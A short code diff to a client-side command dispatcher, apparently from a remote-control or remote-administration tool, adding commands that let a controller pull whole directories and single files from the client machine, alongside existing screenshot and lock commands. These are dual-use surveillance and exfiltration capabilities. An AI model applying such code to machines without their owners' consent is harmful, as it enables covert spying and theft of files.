@@ -27,8 +27,10 @@ class CommandHandler:
             self.control.screenshot()
         elif _command == CLIENT_UPLOAD_FILE:
             self.control.download(command["value"]["buffer"], command["value"]["value"])
-        elif _command == CLIENT_RECV_FILE:
-            self.control.send_file(command["value"])
+        elif _command == CLIENT_DWNL_DIR:
+            self.control.upload_dir(command["value"])
+        elif _command == CLIENT_DWNL_FILE:
+            self.control.upload(command["value"])
         elif _command == CLIENT_LOCK:
             self.control.lock()
         elif _command == CLIENT_HEARTBEAT:
